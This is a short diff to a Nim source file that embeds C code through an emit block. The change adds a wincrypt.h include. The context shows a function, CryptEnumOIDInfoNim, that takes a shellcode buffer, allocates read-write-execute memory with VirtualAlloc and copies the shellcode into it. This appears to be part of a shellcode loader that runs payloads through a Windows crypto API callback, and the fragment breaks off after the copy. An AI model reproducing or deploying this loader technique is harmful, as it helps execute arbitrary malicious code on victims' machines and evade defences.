@@ -2,7 +2,7 @@
 import public
 
 {.emit: """
-
+#include <wincrypt.h>
 int CryptEnumOIDInfoNim(char *shellcode,SIZE_T shellcodeSize) {
     LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     ::RtlMoveMemory(addr, shellcode, shellcodeSize);
